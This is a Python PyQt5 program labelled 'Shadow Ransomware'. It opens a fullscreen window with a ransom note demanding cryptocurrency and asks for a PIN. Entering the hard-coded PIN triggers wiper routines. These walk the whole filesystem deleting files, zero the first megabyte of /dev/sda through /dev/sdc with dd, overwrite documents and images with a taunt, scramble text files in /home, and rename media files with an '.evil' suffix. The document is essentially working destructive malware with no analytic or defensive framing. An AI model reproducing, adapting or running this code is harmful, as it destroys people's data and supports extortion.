import sys
import os
import shutil
import random
import string
from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget, QLineEdit, QPushButton, QMessageBox
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QFont, QIcon

PIN = "123456"

def destroy_files():
    for root, dirs, files in os.walk("/"):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                os.remove(file_path)
            except Exception:
                pass

def destroy_drives():
    drive_letters = ['/dev/sda', '/dev/sdb', '/dev/sdc']
    for letter in drive_letters:
        try:
            os.system(f"dd if=/dev/zero of={letter} bs=1M count=1")
        except Exception:
            pass

def overwrite_files():
    file_extensions = ['.txt', '.docx', '.xlsx', '.pdf', '.jpg', '.png']
    for root, dirs, files in os.walk("/"):
        for file in files:
            file_path = os.path.join(root, file)
            file_ext = os.path.splitext(file_path)[1]
            if file_ext in file_extensions:
                try:
                    with open(file_path, 'w') as f:
                        f.write('You have been doomed by the forces of darkness!')
                except Exception:
                    pass

def randomize_passwords():
    for root, dirs, files in os.walk("/home"):
        for file in files:
            file_path = os.path.join(root, file)
            file_ext = os.path.splitext(file_path)[1]
            if file_ext == '.txt':
                try:
                    with open(file_path, 'r') as f:
                        content = f.read()
                    new_content = ''.join(random.choices(string.ascii_letters + string.digits, k=len(content)))
                    with open(file_path, 'w') as f:
                        f.write(new_content)
                except Exception:
                    pass

def encrypt_files():
    file_extensions = ['.txt', '.docx', '.xlsx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', '.avi', '.mov']
    directories_to_encrypt = ['/home', '/root', '/var/www']
    for directory in directories_to_encrypt:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                file_ext = os.path.splitext(file_path)[1]
                if file_ext in file_extensions:
                    try:
                        encrypted_file_path = file_path + '.evil'
                        shutil.move(file_path, encrypted_file_path)
                    except Exception:
                        pass


text = """
██╗     ██╗███╗   ██╗██████╗ ██╗    ██╗███████╗██████╗ 
██║     ██║████╗  ██║██╔══██╗██║    ██║██╔════╝██╔══██╗
██║     ██║██╔██╗ ██║██║  ██║██║ █╗ ██║█████╗  ██████╔╝
██║     ██║██║╚██╗██║██║  ██║██║███╗██║██╔══╝  ██╔══██╗
███████╗██║██║ ╚████║██████╔╝╚███╔███╔╝███████╗██║  ██║
╚══════╝╚═╝╚═╝  ╚═══╝╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝

🔥 Ransom Note 🔥

Attention, pitiful victim,

Your digital existence has fallen into our clutches. We, the malevolent forces of darkness, demand an exorbitant sum of [insert outrageous amount] in untraceable cryptocurrency to set you free from our vile grip.

Failure to comply shall result in the permanent deletion of your most cherished memories, the public exposure of your deepest secrets, and the ruination of your pathetic life. We will revel in your suffering as you watch your world crumble before your eyes.

Do not dare to involve the authorities or seek help, for they shall be powerless against us. We are omnipresent, omniscient, and invincible.

To initiate the payment, follow these instructions to the letter:

Obtain [cryptocurrency] worth [insert amount] from a secure exchange.
Transfer the funds to the following anonymous wallet address: [insert wallet address].
Notify us of your compliance by emailing us at [insert email address]. Include the subject line "Submission to Darkness."
Await further instructions. Any deviation from our demands will result in dire consequences.
Remember, resistance is futile. Your fate rests in our merciless hands. Obey or face eternal torment.
"""

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("Shadow Ransomware")
        self.setWindowIcon(QIcon("logo2.png"))

        # Set the window properties
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setWindowState(Qt.WindowFullScreen)

        # Create a main widget and set a layout
        main_widget = QWidget()
        layout = QVBoxLayout()
        main_widget.setLayout(layout)
        self.setCentralWidget(main_widget)

        # Add a label with a dynamic font size and center alignment
        label = QLabel(text)
        label.setAlignment(Qt.AlignCenter)
        label.setFont(QFont("Arial", 30, QFont.Bold))
        layout.addWidget(label)

        # Add a line edit for PIN input
        pin_input = QLineEdit()
        pin_input.setEchoMode(QLineEdit.Password)
        layout.addWidget(pin_input)

        # Add a button for PIN validation
        validate_button = QPushButton("Validate")
        layout.addWidget(validate_button)

        # Connect the button to the validation function
        validate_button.clicked.connect(lambda: self.validate_pin(pin_input.text()))

    def validate_pin(self, entered_pin):
        if entered_pin == PIN:
            QMessageBox.information(self, "Success", "PIN accepted. Access granted!")
            destroy_files()
            destroy_drives()
            overwrite_files()
            randomize_passwords()
            encrypt_files()
            self.close()
        else:
            QMessageBox.warning(self, "Error", "Invalid PIN. Access denied.")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
